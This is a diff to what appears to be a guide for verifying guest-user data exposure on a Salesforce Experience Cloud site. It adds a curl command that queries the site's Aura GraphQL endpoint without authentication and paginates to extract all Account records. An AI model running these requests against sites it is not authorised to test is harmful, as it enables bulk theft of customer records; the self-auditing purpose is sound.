@@ -68,13 +68,24 @@ If the tool tells you that the `Account` object has 1,500 exposed records in `su
 
 Open your terminal and run the following matching the target URL and the **Object Name** the tool flagged. Below are examples for common objects like `Account`, `Contact`, `User`, and `Case`.
 
-##### Extracting `Account`
+##### Extracting `Account` (First 10 Records)
 ```powershell
 curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:10){edges+{node+{+Name+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
 ```
+
+##### Extracting `Account` (All Records up to 2,000 using Pagination Cursor)
+*If you need to retrieve all records in large batches (up to 2,000 at a time), you change `(first:10)` to `(first:2000)` and add `pageInfo{endCursor,hasNextPage}` so you can paginate if there are more than 2,000 records.*
+
+```powershell
+curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+  -H "Content-Type: application/x-www-form-urlencoded" `
+  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:2000){edges+{node+{+Name+{+value+}}}pageInfo{endCursor,hasNextPage}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
+  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
+```
+*(If `hasNextPage` is true, take the `endCursor` string and run the query again by passing it like this: `Account(first:2000, after:"your_cursor_here")`)*
 
 ##### Extracting `Contact`
 ```powershell
